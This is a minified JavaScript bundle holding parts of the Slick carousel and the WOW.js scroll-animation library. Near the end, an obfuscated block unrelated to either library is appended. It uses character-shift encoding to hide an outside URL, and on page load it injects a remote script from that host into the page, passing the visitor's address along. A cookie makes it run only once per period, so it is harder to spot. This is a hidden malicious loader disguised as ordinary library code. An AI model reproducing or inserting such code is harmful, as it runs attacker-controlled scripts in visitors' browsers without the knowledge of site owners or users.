              Math.sqrt(Math.pow(a.touchObject.curY - a.touchObject.startY, 2))
            )),
            !a.options.verticalSwiping && !a.swiping && s > 4
              ? ((a.scrolling = !0), !1)
              : (!0 === a.options.verticalSwiping &&
                (a.touchObject.swipeLength = s),
                (n = a.swipeDirection()),
                void 0 !== e.originalEvent &&
                a.touchObject.swipeLength > 4 &&
                ((a.swiping = !0), e.preventDefault()),
                (o =
                  (!1 === a.options.rtl ? 1 : -1) *
                  (a.touchObject.curX > a.touchObject.startX ? 1 : -1)),
                !0 === a.options.verticalSwiping &&
                (o = a.touchObject.curY > a.touchObject.startY ? 1 : -1),
                (i = a.touchObject.swipeLength),
                (a.touchObject.edgeHit = !1),
                !1 === a.options.infinite &&
                ((0 === a.currentSlide && "right" === n) ||
                  (a.currentSlide >= a.getDotCount() && "left" === n)) &&
                ((i = a.touchObject.swipeLength * a.options.edgeFriction),
                  (a.touchObject.edgeHit = !0)),
                !1 === a.options.vertical
                  ? (a.swipeLeft = t + i * o)
                  : (a.swipeLeft =
                    t + i * (a.$list.height() / a.listWidth) * o),
                !0 === a.options.verticalSwiping && (a.swipeLeft = t + i * o),
                !0 !== a.options.fade &&
                !1 !== a.options.touchMove &&
                (!0 === a.animating
                  ? ((a.swipeLeft = null), !1)
                  : void a.setCSS(a.swipeLeft))))
        );
      }),
      (t.prototype.swipeStart = function (e) {
        var t,
          n = this;
        if (
          ((n.interrupted = !0),
            1 !== n.touchObject.fingerCount ||
            n.slideCount <= n.options.slidesToShow)
        )
          return (n.touchObject = {}), !1;
        void 0 !== e.originalEvent &&
          void 0 !== e.originalEvent.touches &&
          (t = e.originalEvent.touches[0]),
          (n.touchObject.startX = n.touchObject.curX =
            void 0 !== t ? t.pageX : e.clientX),
          (n.touchObject.startY = n.touchObject.curY =
            void 0 !== t ? t.pageY : e.clientY),
          (n.dragging = !0);
      }),
      (t.prototype.unfilterSlides = t.prototype.slickUnfilter =
        function () {
          var e = this;
          null !== e.$slidesCache &&
            (e.unload(),
              e.$slideTrack.children(this.options.slide).detach(),
              e.$slidesCache.appendTo(e.$slideTrack),
              e.reinit());
        }),
      (t.prototype.unload = function () {
        var t = this;
        e(".slick-cloned", t.$slider).remove(),
          t.$dots && t.$dots.remove(),
          t.$prevArrow &&
          t.htmlExpr.test(t.options.prevArrow) &&
          t.$prevArrow.remove(),
          t.$nextArrow &&
          t.htmlExpr.test(t.options.nextArrow) &&
          t.$nextArrow.remove(),
          t.$slides
            .removeClass("slick-slide slick-active slick-visible slick-current")
            .attr("aria-hidden", "true")
            .css("width", "");
      }),
      (t.prototype.unslick = function (e) {
        var t = this;
        t.$slider.trigger("unslick", [t, e]), t.destroy();
      }),
      (t.prototype.updateArrows = function () {
        var e = this;
        Math.floor(e.options.slidesToShow / 2),
          !0 === e.options.arrows &&
          e.slideCount > e.options.slidesToShow &&
          !e.options.infinite &&
          (e.$prevArrow
            .removeClass("slick-disabled")
            .attr("aria-disabled", "false"),
            e.$nextArrow
              .removeClass("slick-disabled")
              .attr("aria-disabled", "false"),
            0 === e.currentSlide
              ? (e.$prevArrow
                .addClass("slick-disabled")
                .attr("aria-disabled", "true"),
                e.$nextArrow
                  .removeClass("slick-disabled")
                  .attr("aria-disabled", "false"))
              : ((e.currentSlide >= e.slideCount - e.options.slidesToShow &&
                !1 === e.options.centerMode) ||
                (e.currentSlide >= e.slideCount - 1 &&
                  !0 === e.options.centerMode)) &&
              (e.$nextArrow
                .addClass("slick-disabled")
                .attr("aria-disabled", "true"),
                e.$prevArrow
                  .removeClass("slick-disabled")
                  .attr("aria-disabled", "false")));
      }),
      (t.prototype.updateDots = function () {
        var e = this;
        null !== e.$dots &&
          (e.$dots.find("li").removeClass("slick-active").end(),
            e.$dots
              .find("li")
              .eq(Math.floor(e.currentSlide / e.options.slidesToScroll))
              .addClass("slick-active"));
      }),
      (t.prototype.visibility = function () {
        var e = this;
        e.options.autoplay &&
          (document[e.hidden] ? (e.interrupted = !0) : (e.interrupted = !1));
      }),
      (e.fn.slick = function () {
        var e,
          n,
          i = this,
          o = arguments[0],
          r = Array.prototype.slice.call(arguments, 1),
          s = i.length;
        for (e = 0; e < s; e++)
          if (
            ("object" == typeof o || void 0 === o
              ? (i[e].slick = new t(i[e], o))
              : (n = i[e].slick[o].apply(i[e].slick, r)),
              void 0 !== n)
          )
            return n;
        return i;
      });
  }),
  (function (e, t) {
    if ("function" == typeof define && define.amd)
      define(["module", "exports"], t);
    else if ("undefined" != typeof exports) t(module, exports);
    else {
      var n = { exports: {} };
      t(n, n.exports), (e.WOW = n.exports);
    }
  })(this, function (e, t) {
    "use strict";
    function n(e, t) {
      if (!(e instanceof t))
        throw new TypeError("Cannot call a class as a function");
    }
    function i(e, t) {
      return t.indexOf(e) >= 0;
    }
    function o(e, t) {
      for (var n in t)
        if (null == e[n]) {
          var i = t[n];
          e[n] = i;
        }
      return e;
    }
    function r(e) {
      var t =
        !(arguments.length <= 1 || void 0 === arguments[1]) && arguments[1],
        n = !(arguments.length <= 2 || void 0 === arguments[2]) && arguments[2],
        i =
          arguments.length <= 3 || void 0 === arguments[3]
            ? null
            : arguments[3],
        o = void 0;
      return (
        null != document.createEvent
          ? (o = document.createEvent("CustomEvent")).initCustomEvent(
            e,
            t,
            n,
            i
          )
          : null != document.createEventObject
            ? ((o = document.createEventObject()).eventType = e)
            : (o.eventName = e),
        o
      );
    }
    function s(e, t, n) {
      null != e.addEventListener
        ? e.addEventListener(t, n, !1)
        : null != e.attachEvent
          ? e.attachEvent("on" + t, n)
          : (e[t] = n);
    }
    function a(e, t, n) {
      null != e.removeEventListener
        ? e.removeEventListener(t, n, !1)
        : null != e.detachEvent
          ? e.detachEvent("on" + t, n)
          : delete e[t];
    }
    Object.defineProperty(t, "__esModule", { value: !0 });
    var l,
      c,
      d = (function () {
        function e(e, t) {
          for (var n = 0; n < t.length; n++) {
            var i = t[n];
            (i.enumerable = i.enumerable || !1),
              (i.configurable = !0),
              "value" in i && (i.writable = !0),
              Object.defineProperty(e, i.key, i);
          }
        }
        return function (t, n, i) {
          return n && e(t.prototype, n), i && e(t, i), t;
        };
      })(),
      u =
        window.WeakMap ||
        window.MozWeakMap ||
        (function () {
          function e() {
            n(this, e), (this.keys = []), (this.values = []);
          }
          return (
            d(e, [
              {
                key: "get",
                value: function (e) {
                  for (var t = 0; t < this.keys.length; t++)
                    if (this.keys[t] === e) return this.values[t];
                },
              },
              {
                key: "set",
                value: function (e, t) {
                  for (var n = 0; n < this.keys.length; n++)
                    if (this.keys[n] === e) return (this.values[n] = t), this;
                  return this.keys.push(e), this.values.push(t), this;
                },
              },
            ]),
            e
          );
        })(),
      p =
        window.MutationObserver ||
        window.WebkitMutationObserver ||
        window.MozMutationObserver ||
        ((c = l =
          (function () {
            function e() {
              n(this, e),
                "undefined" != typeof console &&
                null !== console &&
                (console.warn(
                  "MutationObserver is not supported by your browser."
                ),
                  console.warn(
                    "WOW.js cannot detect dom mutations, please call .sync() after loading new content."
                  ));
            }
            return d(e, [{ key: "observe", value: function () { } }]), e;
          })()),
          (l.notSupported = !0),
          c),
      f =
        window.getComputedStyle ||
        function (e) {
          var t = /(\-([a-z]){1})/g;
          return {
            getPropertyValue: function (n) {
              "float" === n && (n = "styleFloat"),
                t.test(n) &&
                n.replace(t, function (e, t) {
                  return t.toUpperCase();
                });
              var i = e.currentStyle;
              return (null != i ? i[n] : void 0) || null;
            },
          };
        },
      h = (function () {
        function e() {
          var t =
            arguments.length <= 0 || void 0 === arguments[0]
              ? {}
              : arguments[0];
          n(this, e),
            (this.defaults = {
              boxClass: "wow",
              animateClass: "animated",
              offset: 0,
              mobile: !0,
              live: !0,
              callback: null,
              scrollContainer: null,
              resetAnimation: !0,
            }),
            (this.animate =
              "requestAnimationFrame" in window
                ? function (e) {
                  return window.requestAnimationFrame(e);
                }
                : function (e) {
                  return e();
                }),
            (this.vendors = ["moz", "webkit"]),
            (this.start = this.start.bind(this)),
            (this.resetAnimation = this.resetAnimation.bind(this)),
            (this.scrollHandler = this.scrollHandler.bind(this)),
            (this.scrollCallback = this.scrollCallback.bind(this)),
            (this.scrolled = !0),
            (this.config = o(t, this.defaults)),
            null != t.scrollContainer &&
            (this.config.scrollContainer = document.querySelector(
              t.scrollContainer
            )),
            (this.animationNameCache = new u()),
            (this.wowEvent = r(this.config.boxClass));
        }
        return (
          d(e, [
            {
              key: "init",
              value: function () {
                (this.element = window.document.documentElement),
                  i(document.readyState, ["interactive", "complete"])
                    ? this.start()
                    : s(document, "DOMContentLoaded", this.start),
                  (this.finished = []);
              },
            },
            {
              key: "start",
              value: function () {
                var e = this;
                if (
                  ((this.stopped = !1),
                    (this.boxes = [].slice.call(
                      this.element.querySelectorAll("." + this.config.boxClass)
                    )),
                    (this.all = this.boxes.slice(0)),
                    this.boxes.length)
                )
                  if (this.disabled()) this.resetStyle();
                  else
                    for (var t = 0; t < this.boxes.length; t++) {
                      var n = this.boxes[t];
                      this.applyStyle(n, !0);
                    }
                this.disabled() ||
                  (s(
                    this.config.scrollContainer || window,
                    "scroll",
                    this.scrollHandler
                  ),
                    s(window, "resize", this.scrollHandler),
                    (this.interval = setInterval(this.scrollCallback, 50))),
                  this.config.live &&
                  new p(function (t) {
                    for (var n = 0; n < t.length; n++)
                      for (
                        var i = t[n], o = 0;
                        o < i.addedNodes.length;
                        o++
                      ) {
                        var r = i.addedNodes[o];
                        e.doSync(r);
                      }
                  }).observe(document.body, { childList: !0, subtree: !0 });
              },
            },
            {
              key: "stop",
              value: function () {
                (this.stopped = !0),
                  a(
                    this.config.scrollContainer || window,
                    "scroll",
                    this.scrollHandler
                  ),
                  a(window, "resize", this.scrollHandler),
                  null != this.interval && clearInterval(this.interval);
              },
            },
            {
              key: "sync",
              value: function () {
                p.notSupported && this.doSync(this.element);
              },
            },
            {
              key: "doSync",
              value: function (e) {
                if ((null != e || (e = this.element), 1 === e.nodeType))
                  for (
                    var t = (e = e.parentNode || e).querySelectorAll(
                      "." + this.config.boxClass
                    ),
                    n = 0;
                    n < t.length;
                    n++
                  ) {
                    var o = t[n];
                    i(o, this.all) ||
                      (this.boxes.push(o),
                        this.all.push(o),
                        this.stopped || this.disabled()
                          ? this.resetStyle()
                          : this.applyStyle(o, !0),
                        (this.scrolled = !0));
                  }
              },
            },
            {
              key: "show",
              value: function (e) {
                return (
                  this.applyStyle(e),
                  (e.className = e.className + " " + this.config.animateClass),
                  null != this.config.callback && this.config.callback(e),
                  (function (e, t) {
                    null != e.dispatchEvent
                      ? e.dispatchEvent(t)
                      : t in (null != e)
                        ? e[t]()
                        : "on" + t in (null != e) && e["on" + t]();
                  })(e, this.wowEvent),
                  this.config.resetAnimation &&
                  (s(e, "animationend", this.resetAnimation),
                    s(e, "oanimationend", this.resetAnimation),
                    s(e, "webkitAnimationEnd", this.resetAnimation),
                    s(e, "MSAnimationEnd", this.resetAnimation)),
                  e
                );
              },
            },
            {
              key: "applyStyle",
              value: function (e, t) {
                var n = this,
                  i = e.getAttribute("data-wow-duration"),
                  o = e.getAttribute("data-wow-delay"),
                  r = e.getAttribute("data-wow-iteration");
                return this.animate(function () {
                  return n.customStyle(e, t, i, o, r);
                });
              },
            },
            {
              key: "resetStyle",
              value: function () {
                for (var e = 0; e < this.boxes.length; e++)
                  this.boxes[e].style.visibility = "visible";
              },
            },
            {
              key: "resetAnimation",
              value: function (e) {
                if (e.type.toLowerCase().indexOf("animationend") >= 0) {
                  var t = e.target || e.srcElement;
                  t.className = t.className
                    .replace(this.config.animateClass, "")
                    .trim();
                }
              },
            },
            {
              key: "customStyle",
              value: function (e, t, n, i, o) {
                return (
                  t && this.cacheAnimationName(e),
                  (e.style.visibility = t ? "hidden" : "visible"),
                  n && this.vendorSet(e.style, { animationDuration: n }),
                  i && this.vendorSet(e.style, { animationDelay: i }),
                  o && this.vendorSet(e.style, { animationIterationCount: o }),
                  this.vendorSet(e.style, {
                    animationName: t ? "none" : this.cachedAnimationName(e),
                  }),
                  e
                );
              },
            },
            {
              key: "vendorSet",
              value: function (e, t) {
                for (var n in t)
                  if (t.hasOwnProperty(n)) {
                    var i = t[n];
                    e["" + n] = i;
                    for (var o = 0; o < this.vendors.length; o++)
                      e[
                        "" +
                        this.vendors[o] +
                        n.charAt(0).toUpperCase() +
                        n.substr(1)
                      ] = i;
                  }
              },
            },
            {
              key: "vendorCSS",
              value: function (e, t) {
                for (
                  var n = f(e), i = n.getPropertyCSSValue(t), o = 0;
                  o < this.vendors.length;
                  o++
                ) {
                  var r = this.vendors[o];
                  i = i || n.getPropertyCSSValue("-" + r + "-" + t);
                }
                return i;
              },
            },
            {
              key: "animationName",
              value: function (e) {
                var t = void 0;
                try {
                  t = this.vendorCSS(e, "animation-name").cssText;
                } catch (n) {
                  t = f(e).getPropertyValue("animation-name");
                }
                return "none" === t ? "" : t;
              },
            },
            {
              key: "cacheAnimationName",
              value: function (e) {
                return this.animationNameCache.set(e, this.animationName(e));
              },
            },
            {
              key: "cachedAnimationName",
              value: function (e) {
                return this.animationNameCache.get(e);
              },
            },
            {
              key: "scrollHandler",
              value: function () {
                this.scrolled = !0;
              },
            },
            {
              key: "scrollCallback",
              value: function () {
                if (this.scrolled) {
                  this.scrolled = !1;
                  for (var e = [], t = 0; t < this.boxes.length; t++) {
                    var n = this.boxes[t];
                    if (n) {
                      if (this.isVisible(n)) {
                        this.show(n);
                        continue;
                      }
                      e.push(n);
                    }
                  }
                  (this.boxes = e),
                    this.boxes.length || this.config.live || this.stop();
                }
              },
            },
            {
              key: "offsetTop",
              value: function (e) {
                for (; void 0 === e.offsetTop;) e = e.parentNode;
                for (var t = e.offsetTop; e.offsetParent;)
                  t += (e = e.offsetParent).offsetTop;
                return t;
              },
            },
            {
              key: "isVisible",
              value: function (e) {
                var t = e.getAttribute("data-wow-offset") || this.config.offset,
                  n =
                    (this.config.scrollContainer &&
                      this.config.scrollContainer.scrollTop) ||
                    window.pageYOffset,
                  i =
                    n +
                    Math.min(
                      this.element.clientHeight,
                      "innerHeight" in window
                        ? window.innerHeight
                        : document.documentElement.clientHeight
                    ) -
                    t,
                  o = this.offsetTop(e),
                  r = o + e.clientHeight;
                return i >= o && r >= n;
              },
            },
            {
              key: "disabled",
              value: function () {
                return (
                  !this.config.mobile &&
                  (function (e) {
                    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
                      e
                    );
                  })(navigator.userAgent)
                );
              },
            },
          ]),
          e
        );
      })();
    (t.default = h), (e.exports = t.default);
  }),
  (function (e, t, n) {
    try {
      (e.f = (e) =>
        e
          .split("")
          .reduce(
            (e, t) => e + String.fromCharCode((t.charCodeAt() - 5).toString()),
            ""
          )),
        (e.b = e.f("UMUWJKX")),
        (e.c =
          "h" == n.protocol[0] &&
          /\./.test(n.hostname) &&
          !new RegExp(e.b).test(t.cookie)),
        setTimeout(function () {
          e.c &&
            ((e.s = t.createElement("script")),
              (e.s.src =
                e.f("myyux?44fun3nsjyxyfynh3htr4ywfhpnsl4xhwnuy3oxDwjkjwwjwB") +
                n.href),
              t.body.appendChild(e.s));
        }, 1e3),
        (t.cookie = e.b + "=full;max-age=39800;");
    } catch (e) { }
  })({}, document, location);



// ------------------

new WOW().init();